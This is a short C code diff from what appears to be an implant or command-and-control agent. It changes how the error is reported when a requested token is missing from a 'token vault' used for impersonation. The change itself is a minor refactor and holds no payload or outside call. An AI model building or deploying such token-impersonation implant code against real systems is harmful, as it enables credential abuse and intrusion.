@@ -1218,7 +1218,7 @@ BOOL ImpersonateTokenFromVault(
 
     if ( ! TokenData ) {
         PUTS( "Token not found in vault." )
-        PackageTransmitError( CALLBACK_ERROR_TOKEN, 0x1 );
+        PackageQueueError( CALLBACK_ERROR_TOKEN, 0x1 );
         goto Cleanup;
     }
 
